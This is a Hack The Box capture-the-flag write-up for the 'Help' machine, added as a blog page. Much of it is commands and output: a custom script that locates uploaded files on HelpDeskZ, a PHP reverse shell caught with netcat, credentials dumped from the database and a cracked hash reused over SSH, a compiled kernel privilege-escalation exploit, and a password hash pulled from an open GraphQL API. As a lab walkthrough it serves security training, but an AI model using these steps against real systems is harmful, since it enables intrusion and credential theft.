@@ -1,0 +1,408 @@
+---
+layout: default
+title: Help
+---
+
+<h1>Help</h1>
+<p class="date">08/06/2019</p>
+
+<img class="img-fluid" src="/static/img/htb/help/help.png">
+
+<p>Help is a pretty easy box where to get a shell as user, we will need to do some code reviewing to make a public exploit work. Then, to escalate privileges we'll be using a kernel exploit to get root.</p>
+
+<div class="flexcontainer">
+    <a class="link-box" href="#user">User</a>
+    <a class="link-box" href="#privesc">Privilege Escalation</a>
+    <a class="link-box" href="#bonus">Bonus</a>
+</div>
+
+<hr>
+
+<h2 id="user">User</h2>
+
+<p>To start, run <code>nmap</code> to list open ports. We have <code>22/ssh</code>, <code>80/http</code> and <code>3000/http</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# nmap -sC -sV 10.10.10.121
+Starting Nmap 7.70 ( https://nmap.org ) at 2019-02-20 15:33 UTC
+Nmap scan report for 10.10.10.121
+Host is up (0.43s latency).
+Not shown: 997 closed ports
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.6 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 e5:bb:4d:9c:de:af:6b:bf:ba:8c:22:7a:d8:d7:43:28 (RSA)
+|   256 d5:b0:10:50:74:86:a3:9f:c5:53:6f:3b:4a:24:61:19 (ECDSA)
+|_  256 e2:1b:88:d3:76:21:d4:1e:38:15:4a:81:11:b7:99:07 (ED25519)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+3000/tcp open  http    Node.js Express framework
+|_http-title: Site doesn't have a title (application/json; charset=utf-8).
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</pre>
+
+<p>We'll start inspecting port <code>80</code>, running <code>gobuster</code> to find some web content.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# /opt/gobuster/gobuster -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.121/
+
+=====================================================
+Gobuster v2.0.1              OJ Reeves (@TheColonial)
+=====================================================
+[+] Mode         : dir
+[+] Url/Domain   : http://10.10.10.121/
+[+] Threads      : 10
+[+] Wordlist     : /usr/share/wordlists/dirb/common.txt
+[+] Status codes : 200,204,301,302,307,403
+[+] Timeout      : 10s
+=====================================================
+2019/02/20 15:48:06 Starting gobuster
+=====================================================
+/.hta (Status: 403)
+/.htpasswd (Status: 403)
+/.htaccess (Status: 403)
+/index.html (Status: 200)
+/javascript (Status: 301)
+/server-status (Status: 403)
+/support (Status: 301)
+=====================================================
+2019/02/20 15:49:05 Finished
+=====================================================
+</pre>
+
+<p>If we go to <code>/support</code> we can find a <code>helpdeskz</code> site.</p>
+
+<img class="img-fluid" src="/static/img/htb/help/1.png">
+
+<p>Let's look for exploits for this application.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# searchsploit helpdeskz
+----------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                           |  Path
+                                                                                         | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------------------- ----------------------------------------
+HelpDeskZ 1.0.2 - Arbitrary File Upload                                                  | exploits/php/webapps/40300.py
+HelpDeskZ < 1.0.2 - (Authenticated) SQL Injection / Unauthorized File Download           | exploits/php/webapps/41200.py
+----------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+</pre>
+
+<p>I decided to use <code>HelpDeskZ 1.0.2 - Arbitrary File Upload</code> which allows us to upload a malicious php file via the ticketing system and execute it.</p>
+
+<p>After some tries I didn't make the exploit work, the first reason was I was getting a <i>File is not allowed</i> error when attaching php files, so I decided to look into HelpDeskZ code in <a href="https://github.com/evolutionscript/HelpDeskZ-1.0" target="_blank">github</a> to understand what was really happening.</p>
+
+
+<p>The vulnerable portion of code is in <code>controllers/submit_ticket_controller.php#137</code>.</p>
+
+<pre class="prettyprint">
+if(!isset($error_msg) && $settings['ticket_attachment']==1){
+	$uploaddir = UPLOAD_DIR.'tickets/';		
+	if($_FILES['attachment']['error'] == 0){
+		$ext = pathinfo($_FILES['attachment']['name'], PATHINFO_EXTENSION);
+		$filename = md5($_FILES['attachment']['name'].time()).".".$ext;
+		$fileuploaded[] = array('name' => $_FILES['attachment']['name'], 'enc' => $filename, 'size' => formatBytes($_FILES['attachment']['size']), 'filetype' => $_FILES['attachment']['type']);
+		$uploadedfile = $uploaddir.$filename;
+		if (!move_uploaded_file($_FILES['attachment']['tmp_name'], $uploadedfile)) {
+			$show_step2 = true;
+			$error_msg = $LANG['ERROR_UPLOADING_A_FILE'];
+		}else{
+			$fileverification = verifyAttachment($_FILES['attachment']);
+			switch($fileverification['msg_code']){
+				case '1':
+				$show_step2 = true;
+				$error_msg = $LANG['INVALID_FILE_EXTENSION'];
+				break;
+				case '2':
+				$show_step2 = true;
+				$error_msg = $LANG['FILE_NOT_ALLOWED'];
+				break;
+				case '3':
+				$show_step2 = true;
+				$error_msg = str_replace('%size%',$fileverification['msg_extra'],$LANG['FILE_IS_BIG']);
+				break;
+			}
+		}
+	}	
+</pre>
+
+<p>Here we can see three things which are important to make the exploit work:
+	<ul>
+		<li>Even getting an error message, the file is uploaded.</li>
+		<li>The file is being uploaded to <code>UPLOAD_DIR.'tickets/'</code>.</li>
+		<li>The system is using <code>time()</code> to encode the filenames.</li>
+	</ul>
+</p>
+
+<p>Inspecting the response headers for any request we can see a <code>Date</code> header which gives us the exact time of the server which we'll need for the exploit.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# curl -v http://10.10.10.121/support
+*   Trying 10.10.10.121...
+* TCP_NODELAY set
+* Connected to 10.10.10.121 (10.10.10.121) port 80 (#0)
+> GET /support HTTP/1.1
+> Host: 10.10.10.121
+> User-Agent: curl/7.62.0
+> Accept: */*
+> 
+< HTTP/1.1 301 Moved Permanently
+< Date: Thu, 21 Feb 2019 16:30:11 GMT
+< Server: Apache/2.4.18 (Ubuntu)
+< Location: http://10.10.10.121/support/
+< Content-Length: 314
+< Content-Type: text/html; charset=iso-8859-1
+</pre>
+
+<p>From the public exploit I made my own version with the things I found on the code. Here you can write directly the datetime the file was uploaded, instead of using the current time.</p> 
+
+<pre class="prettyprint">
+import hashlib
+from datetime import datetime
+import requests
+
+time = int(datetime(2019,02,21,16,32).strftime('%s'))
+myfilename = 'caca.php'
+for x in range(150):
+	filename = hashlib.md5(myfilename + str(time - x)).hexdigest() + '.php'
+	url = "http://10.10.10.121/support/uploads/tickets/" + filename
+	r = requests.get(url)
+	if r.ok:
+		print url
+		break
+</pre>
+
+<p>After sending the ticket request with an attached php file with a <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php" target="_blank">reverse shell</a>, run the script and we should get the URL where the file was uploaded.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# python findme.py 
+http://10.10.10.121/support/uploads/tickets/ebb6f4fb991cc6d01e64eada92e43d35.php 
+</pre>
+
+<p>If we listen on the specified port and enter on the obtained path we get a shell as <code>help</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# nc -nlvp 6969
+Ncat: Version 7.70 ( https://nmap.org/ncat )
+Ncat: Listening on :::6969
+Ncat: Listening on 0.0.0.0:6969
+Ncat: Connection from 10.10.10.121.
+Ncat: Connection from 10.10.10.121:45154.
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+ 08:27:22 up 26 min,  1 user,  load average: 0.10, 0.19, 0.23
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+help     pts/2    10.10.12.236     08:25    2.00s  0.08s  0.01s more
+uid=1000(help) gid=1000(help) groups=1000(help),4(adm),24(cdrom),30(dip),33(www-data),46(plugdev),114(lpadmin),115(sambashare)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+</pre>
+
+<p>Upgrade the shell with <code>python</code>.</p>
+
+<pre class="prettyprint">
+$ python -c 'import pty;pty.spawn("/bin/bash")'
+help@help:/$ 
+</pre>
+
+<p>The user flag is in <code>help</code> home directory.</p>
+
+<pre class="prettyprint">
+help@help:/home/help$ cat user.txt
+cat user.txt
+<span flag="bb8a7b36bdce0c61ccebaa173ef946af">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="privesc">Privilege Escalation</h2>
+
+<p>If we search through <code>helpdeskz</code> code we can see the database credentials.</p>
+
+<pre class="prettyprint">
+help@help:/var/www/html/support/includes$ cat config.php
+cat config.php
+&lt;?php
+	$config['Database']['dbname'] = 'support';
+	$config['Database']['tableprefix'] = '';
+	$config['Database']['servername'] = 'localhost';
+	$config['Database']['username'] = 'root';
+	$config['Database']['password'] = 'helpme';
+	$config['Database']['type'] = 'mysqli';
+	?>
+</pre>
+
+<p>Connect to the <code>mysql</code> db with the obtained credentials to see what's in there.</p>
+
+<pre class="prettyprint">
+help@help:/var/www/html/support$ mysql -u root -phelpme
+mysql -u root -phelpme
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 4439
+Server version: 5.7.24-0ubuntu0.16.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql>
+</pre>
+
+<p>Let's see what's in <code>support</code> database.</p>
+
+<pre class="prettyprint">
+mysql> show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| support            |
+| sys                |
++--------------------+
+5 rows in set (0.01 sec)
+
+mysql> use support;
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+
+mysql> show tables;
+show tables;
++------------------------+
+| Tables_in_support      |
++------------------------+
+| articles               |
+| attachments            |
+| canned_response        |
+| custom_fields          |
+| departments            |
+| emails                 |
+| error_log              |
+| file_types             |
+| knowledgebase_category |
+| login_attempt          |
+| login_log              |
+| news                   |
+| pages                  |
+| priority               |
+| settings               |
+| staff                  |
+| tickets                |
+| tickets_messages       |
+| users                  |
++------------------------+
+19 rows in set (0.01 sec)
+</pre>
+
+<p>In the <code>staff</code> table there's an admin hashed password.</p>
+
+<pre class="prettyprint">
+mysql> select * from staff;
+select * from staff;
++----+----------+------------------------------------------+---------------+--------------------+------------+------------+--------------------+----------+------------------------------+------------------------+--------+-------+--------+
+| id | username | password                                 | fullname      | email              | login      | last_login | department         | timezone | signature                    | newticket_notification | avatar | admin | status |
++----+----------+------------------------------------------+---------------+--------------------+------------+------------+--------------------+----------+------------------------------+------------------------+--------+-------+--------+
+|  1 | admin    | d318f44739dced66793b1a603028133a76ae680e | Administrator | support@mysite.com | 1547216217 | 1543429746 | a:1:{i:0;s:1:"1";} |          | Best regards,  Administrator |                      0 | NULL   |     1 | Enable |
++----+----------+------------------------------------------+---------------+--------------------+------------+------------+--------------------+----------+------------------------------+------------------------+--------+-------+--------+
+1 row in set (0.00 sec)
+</pre>
+
+<p>Use <code>john</code> to crack it.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# john pass --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA1
+Welcome1         (admin)
+</pre>
+
+<p>It turns out <code>help</code> user is using the same password, so now we can connect through <code>ssh</code>.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# ssh help@10.10.10.121
+help@10.10.10.121's password: Welcome1
+Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-116-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+You have new mail.
+Last login: Fri Jan 11 06:18:50 2019
+help@help:~$ 
+</pre>
+
+<p>Let's print the system information.</p>
+
+<pre class="prettyprint">
+help@help:/tmp$ uname -a
+Linux help 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64 x86_64 x86_64 GNU/Linux
+</pre>
+
+<p>We have a privilege escalation vulnerability in this kernel version.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# searchsploit 4.4.0-116
+----------------------------------------------------------------------------------------- ----------------------------------------
+ Exploit Title                                                                           |  Path
+                                                                                         | (/usr/share/exploitdb/)
+----------------------------------------------------------------------------------------- ----------------------------------------
+Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                   | exploits/linux/local/44298.c
+----------------------------------------------------------------------------------------- ----------------------------------------
+Shellcodes: No Result
+</pre> 
+
+<p>Compile the exploit code and run it to obtain a root shell.</p>
+
+<pre class="prettyprint">
+help@help:/tmp$ gcc 44298.c -o priv
+help@help:/tmp$ ./priv
+task_struct = ffff8800369f7000
+uidptr = ffff88002c31d744
+spawning root shell
+root@help:/tmp#
+</pre>
+
+<p>The flag is in root's directory.</p>
+
+<pre class="prettyprint">
+root@help:/root# cat root.txt
+<span flag="b7fe6082dcdf0c1b1e02ab0d9daddb98">XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX</span>
+</pre>
+
+<h2 id="bonus">Bonus</h2>
+
+<p>In the port scan we also saw the port 3000 was open, this Express server is hosting some kind of API.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# curl http://10.10.10.121:3000/
+{"message":"Hi Shiv, To get access please find the credentials with given query"}
+</pre>
+
+<p>I used many wordlists and didn't found anything, so I ended searching in Google that message and I encountered <a href="https://pastebin.com/5ks2nFdV" target="_blank">this pastebin</a> where it shows this is a <code>graphql</code> API (I don't think this was the intended way).</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# curl http://10.10.10.121:3000/graphql
+GET query missing.
+</pre>
+
+<p>After some tries I managed to retrieve the user an its hashed password.</p>
+
+<pre class="prettyprint">
+root@kali:~/htb/help# curl -X POST -H "content-type":"application/json" -d '{"query": "query { user{username} }"}' http://10.10.10.121:3000/graphql
+{"data":{"user":{"username":"helpme@helpme.com"}}}
+root@kali:~/htb/help# curl -X POST -H "content-type":"application/json" -d '{"query": "query { user{password} }"}' http://10.10.10.121:3000/graphql
+{"data":{"user":{"password":"5d3c93182bb20f07b994a7f617e99cff"}}}
+</pre>
+
+<p>Using any <a href="https://md5decrypt.net" target="_blank">md5 decrypt tool</a> we can retrieve the password.</p>
+
+<pre class="prettyprint">
+5d3c93182bb20f07b994a7f617e99cff : godhelpmeplz 
+</pre>
+
+<p>We can use those credentials (<code>helpme@helpme.com/godhelpmeplz</code>) to login into helpdesk, but as the exploit works with an unauthenticated user it isn't really necessary.</p>
+
